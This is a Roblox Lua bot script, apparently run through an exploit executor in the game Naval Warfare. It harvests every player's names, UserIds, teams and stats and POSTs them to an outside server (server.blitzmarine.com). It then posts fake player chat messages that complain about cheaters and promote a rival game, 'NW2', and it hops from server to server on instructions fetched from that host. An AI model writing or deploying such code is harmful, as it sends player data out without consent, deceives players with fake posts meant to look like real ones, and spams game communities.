if not game:IsLoaded() then game.Loaded:Wait() end

local Players = game:GetService("Players")
local speaker = Players.LocalPlayer
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local messages = {
	"bro this game got way too many hackrs",
	"man every server got someone cheatin smh",
	"naval warfrare is unplayable with all these exploiters",
	"how is there still no anticheat in 2025 ",
	"this game fallen off cuz of all the hakers",
	"bruh the devs really don't care bout all these cheters huh",
	"every time i join theres another exploiter...",
	"game woud be fun if there wasn’t 10 hackers per match",
	"why they even let ppl ruin the game like this",
	"too many cheaters in this game its crazy",
	"ay can we get some kinda anticheat or sum??",
	"tired of playin this w all these hackers",
	"this game ain’t the same no more fr",
	"sheesh the hackers took over lmao",
	"i miss when naval warfare was actually playable",
	"how this game got no hacker protection??",
	"ngl naval warfare lowkey ded cuz of exploiters",
	"every match i gotta deal w/ some goofy cheating",
	"devs fr just let the game rot",
	"hackers stay ruinin this game bruh",
	"can’t even enjoy the game with these cheeters",
	"wish they’d do sum bout the exploiters smh",
	"naval warfares basically hacker land rn",
	"its wild how this still aint patched",
	"if u tired of hackers just quit this mess",
	"tired of tryna play fair and gettin wrecked by cheaters",
	"this game got zero protection lol",
	"i’m done playin till they fix the cheatfest",
	"theres ALWAYS a cheater every round i swear",
	"naval warfrare been taken over by exploitin clowns",
	"ay NW2 got that solid anti-cheat fr",
	"NW2 anticheat is goated no lie",
	"love how clean nw2 lobbys are",
	"no cheaters in naval warfare two, just real skill",
	"NW2 lowkey saved the naval games",
	"naval warfare two don’t play with them hackers",
	"u can actually play normal in nw2",
	"shoutout 2 NW2 for actually havin anticheat",
	"nw2 devs actualy care bro",
	"no hackers ruinin stuff in NW2",
	"NW2 built diff when it comes 2 keepin lobbies clean",
	"naval warfaer two anticheat >>>",
	"real ones play NW2 where lobbys ain’t wrecked",
	"can finaly enjoy the game w/out cheaters in nw2",
	"NW2 keepin the clowns OUT fr",
	"cleanest naval game rn hands down",
	"NW2 doesn’t tolerate cheaters at ALL",
	"havent seen a single exploiter in NW2, w",
	"NW2 anti cheat on point",
	"finaly a naval game w/ protection",
	"been playin nw2 all day, no exploiters at all",
	"NW2 said nah to hackers lol",
	"naval warfrae two got the best system for keepin it fair",
	"NW2 made all the right moves tbh",
	"real ppl play NW2, no cheaters here",
	"NW2 lobbies wayyy better no cap",
	"if u sick of hackers just play NW2 already lol"
}

local function contains(list, str)return table.find(list, str) ~= nil end


local status, err = pcall(function()
	local data = {}
	for _, p in pairs(Players:GetPlayers()) do
		local l = p:FindFirstChild("leaderstats")
		data[p.Name]={l.Score.Value,l.Win.Value,l.Coin.Value,p.Team.Name,p.DisplayName,p.UserId}
	end

	request({Url="https://server.blitzmarine.com/api/update?&bot="..speaker.Name,Method="POST",Body=game:GetService("HttpService"):JSONEncode({id=game.JobId,players=data,islands={},japan=1,usa=1,vehicles={},time=1}),Headers={["Content-Type"]="application/json"}})
	task.wait(1)
	ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(messages[math.random(#messages)], "All")
end)

while task.wait(.1) do
	local status, err = pcall(function() 
		local r=request({Url="https://server.blitzmarine.com/?bot=yes",Method="GET"})
		local d=game:GetService("HttpService"):JSONDecode(r.Body)
		game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId,d[1].id,speaker)
	end)
end
